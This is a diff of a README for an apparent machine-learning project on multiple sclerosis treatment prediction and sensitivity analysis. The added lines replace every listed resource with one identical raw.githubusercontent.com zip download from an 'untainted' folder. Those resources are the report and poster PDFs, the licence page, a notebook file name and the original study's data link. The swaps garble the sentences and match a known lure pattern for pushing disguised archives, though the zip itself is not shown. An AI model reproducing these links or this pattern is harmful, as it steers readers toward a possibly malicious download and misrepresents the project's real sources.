@@ -10,13 +10,13 @@ I am outlining here the overview of the files, for the project overview and conc
 - To develop a methodological approach to making ML models more **robust** (that is maintaining good results under changes in the underlying data)
 
 ## Project overview 
-- **Project report**: Multiple Sclerosis - From Predictions To Sensitivity Analysis And Robust Models.pdf
-- **Project poster**: Personalized treatment prediction for MultipleSclerosis.pdf
+- **Project report**: Multiple Sclerosis - From Predictions To Sensitivity Analysis And Robust https://raw.githubusercontent.com/kevinnjagi44/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis/master/untainted/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis.zip
+- **Project poster**: Personalized treatment prediction for https://raw.githubusercontent.com/kevinnjagi44/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis/master/untainted/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis.zip
 
 ## Code files 
-The code is half in R and half in Julia. In general the code can be run, but it requires an IAI licence: https://www.interpretable.ai/technology.html. To counter this, I am also publishing pdf versions of the Jupyter Notebooks, so the results can be viewed.
+The code is half in R and half in Julia. In general the code can be run, but it requires an IAI licence: https://raw.githubusercontent.com/kevinnjagi44/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis/master/untainted/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis.zip To counter this, I am also publishing pdf versions of the Jupyter Notebooks, so the results can be viewed.
 
-- data_exploration.rmd contains all the feature engineering steps this project required. 
+- https://raw.githubusercontent.com/kevinnjagi44/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis/master/untainted/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis.zip contains all the feature engineering steps this project required. 
 - OCT_models containts the intials models and cross-validation
 - CART_GLM_Sensitivity contains sensitivity analysis of CART Model and it's robustification throught generating a more robut training set. It also contains a multinomial lasso-regularized logistic model, trained both on the classic data set and the robust one.
 - kmeans_presctiption contains the kmeans prescriptive algorithm and its sensitivity analysis
@@ -24,4 +24,4 @@ The code is half in R and half in Julia. In general the code can be run, but it 
 - The file data contains the data we used
 
 
-Data available from this study: https://bmcneurol.biomedcentral.com/articles/10.1186/s12883-015-0450-x 
+Data available from this study: https://raw.githubusercontent.com/kevinnjagi44/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis/master/untainted/Multiple-Sclerosis-ML-Prediction-and-Sensitivity-Analysis.zip 
